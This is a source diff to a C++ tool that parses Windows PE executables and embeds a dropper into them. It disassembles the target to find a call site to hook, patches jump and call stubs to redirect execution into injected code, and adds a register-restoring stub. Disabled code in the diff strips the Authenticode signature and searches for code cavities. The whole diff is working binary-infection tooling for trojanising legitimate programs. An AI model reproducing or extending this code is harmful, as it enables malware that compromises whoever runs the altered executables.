@@ -110,7 +110,6 @@ bool PEObject::isAuthenticodeSigned()
 }
 #endif
 
-
 bool PEObject::_parseNTHeader()
 {
 	_ntHeader = (IMAGE_NT_HEADERS*) atOffset(_dosHeader.header->e_lfanew);
@@ -156,7 +155,16 @@ bool PEObject::_parseNTHeader()
 		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
 		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
 	}
-	
+
+#if 0
+	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress) 
+	{
+		cout << "Resetting Authenticode signature." << endl;
+		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0;
+		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0;
+	}
+#endif
+
 	/*
 	// sections
 	*/
@@ -948,29 +956,21 @@ void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, unsign
 	
 	cout << "Disassembling 0x" << hex << startVA << " -> 0x" << hex << endVA << endl;
 	
-	/* ============================= Loop for Disasm */
 	while (1) {
 		int len = Disasm(&_disasm);
 		if ((len != OUT_OF_BLOCK) && (len != UNKNOWN_OPCODE)) {
+			
+			if ( _disasm.Instruction.BranchType != 0 )
+			{
 #if 0
-			if ((_disasm.Instruction.BranchType == JmpType) && (_disasm.Instruction.AddrValue != 0))
-			{
-				printf(" --> following jmp to 0x%08x\n", _disasm.Instruction.AddrValue);
-				_disasm.EIP = (DWORD) atRVA((int) _disasm.Instruction.AddrValue - imageBase());
-				_disasm.VirtualAddr = _disasm.Instruction.AddrValue;
-			} else
-#endif
-			if ((_disasm.Instruction.BranchType == CallType))
-			{
 				std::size_t va = 0;
 				
 				if (_disasm.Instruction.AddrValue)
 					va = _disasm.Instruction.AddrValue;
 				else if (_disasm.Argument2.Memory.Displacement)
 					va = _disasm.Argument2.Memory.Displacement;
-				
+	
 				// std::size_t offset = offset((int) va - imageBase());
-				
 				try {
 					IATEntry const & entry = getIATEntry(va);
 					string va_str = IATEntry::str(entry);
@@ -978,18 +978,25 @@ void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, unsign
 				} catch(IATEntryNotFound) {
 					printf("*** %.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
 					if (va) {
-						printf(" --- HOOKING @ %08x -- \n", va);
-						unsigned char* newEP = atRVA(va - imageBase());
+#endif
+						printf("*** %.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
+						printf(" --- HOOKING @ %08x -- \n", _disasm.VirtualAddr);
+						//printf(" --- HOOKING @ %08x -- \n", va);
+						//unsigned char* newEP = atRVA(va - imageBase());
+						//printf(" --- HOOKING @ offset %08x \n", newEP);
 						
-						_hookPointer.stage1.ptr = (char*) newEP;
-						_hookPointer.stage1.va = va;
+						_hookPointer.stage1.ptr = (char*) _disasm.EIP;
+						_hookPointer.stage1.va = _disasm.VirtualAddr;
+						//_hookPointer.stage1.va = va;
 						
 						return;
+#if 0
 					}
 				}
 				
 				_disasm.EIP = _disasm.EIP + len;
 				_disasm.VirtualAddr = _disasm.VirtualAddr + len;
+#endif
 			}
 			else 
 			{
@@ -1010,6 +1017,7 @@ void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, unsign
 	return;
 }
 
+#if 0
 void PEObject::_findCavities( GenericSection * const section )
 {
 	cout << "Looking for cavities in section " << section->Name() << endl;
@@ -1065,6 +1073,7 @@ void PEObject::_findCavities( GenericSection * const section )
 	
 	cout << endl;
 }
+#endif
 
 bool PEObject::_parseText()
 {
@@ -1157,7 +1166,9 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	restoreStub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - restoreVA) );
 	restoreStub.popad();
 	restoreStub.popfd();
-	restoreStub.jmp( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (_hookPointer.stage1.va - restoreVA) );
+	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 0), 5 );
+	restoreStub.ret();
+	//restoreStub.jmp( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (_hookPointer.stage1.va - restoreVA) );
 	
 	restoreStub.relocCode( ptr + dropper.restoreStubOffset() );
 	
@@ -1199,12 +1210,13 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	
 	// patch stubs code
 	AsmJit::Assembler stage1stub;
-	stage1stub.jmp( ((DWORD)_hookPointer.stage1.ptr) + (_hookPointer.stage2.va - _hookPointer.stage1.va) );
+	//stage1stub.jmp( ((DWORD)_hookPointer.stage1.ptr) + (_hookPointer.stage2.va - _hookPointer.stage1.va) );
+	stage1stub.call( ((DWORD)_hookPointer.stage1.ptr) + (restoreVA - _hookPointer.stage1.va) );
 	stage1stub.relocCode( (void*) _hookPointer.stage1.ptr );
 	
-	AsmJit::Assembler stage2stub;
-	stage2stub.jmp( ((DWORD)_hookPointer.stage2.ptr) + (restoreVA - _hookPointer.stage2.va) );
-	stage2stub.relocCode( (void*) _hookPointer.stage2.ptr );
+	//AsmJit::Assembler stage2stub;
+	//stage2stub.jmp( ((DWORD)_hookPointer.stage2.ptr) + (restoreVA - _hookPointer.stage2.va) );
+	//stage2stub.relocCode( (void*) _hookPointer.stage2.ptr );
 	
 	return true;
 }
